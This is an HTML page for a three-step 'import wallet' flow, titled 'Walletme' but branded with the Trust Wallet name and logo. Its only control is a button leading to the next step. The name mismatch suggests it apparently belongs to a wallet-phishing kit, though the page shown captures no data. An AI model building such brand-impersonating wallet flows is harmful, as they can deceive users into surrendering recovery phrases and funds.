<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Walletme — Import Wallet</title>
    <link rel="stylesheet" href="styles.css" />
  </head>
  <body class="t4-page">
    <div class="page-shell t4-shell">
      <!-- <header class="topbar compact-topbar">
        <div class="brand" aria-label="Walletme home">
          <div class="brand-mark">
            <span class="shield-shape"></span>
          </div>
          <div class="brand-word">Trust Wallet</div>
        </div>
      </header> -->

      <main class="security-layout t4-layout">
        <aside class="security-sidebar t4-sidebar">
          <div class="mini-brand">
            <img src="unnamed.png" class="brand-img" alt="Trust Wallet" />
            <div class="brand-word small-word">Trust Wallet</div>
          </div>

          <div class="security-copy t4-copy">
            <div class="step-label">Step 2 of 3</div>
            <h2>Import a wallet</h2>
          </div>

          <div class="security-visual t4-illustration" aria-hidden="true">
            <div class="shield-illustration large-shield laptop-art">
              <div class="shield-top"></div>
              <div class="scanner-bar"></div>
              <div class="scan-lines"></div>
              <div class="fingerprint"></div>
            </div>
          </div>
        </aside>

        <section class="security-panel t4-panel">
          <div class="t4-card">
            <button class="back-link" onclick="window.location.href='security.html'">&lt; Back</button>

            <h3 class="t4-title">Select your existing wallet</h3>

            <div class="wallet-list">
              <button class="wallet-item trust-wallet-option" type="button" data-target="t7.html" onclick="window.location.href='t7.html'">
                <span class="wallet-logo trust">T</span>
                <span class="wallet-name">Trust Wallet Mobile</span>
                <span class="wallet-arrow">›</span>
              </button>
            </div>
          </div>
        </section>
      </main>
    </div>
    <script src="script.js"></script>
  </body>
</html>
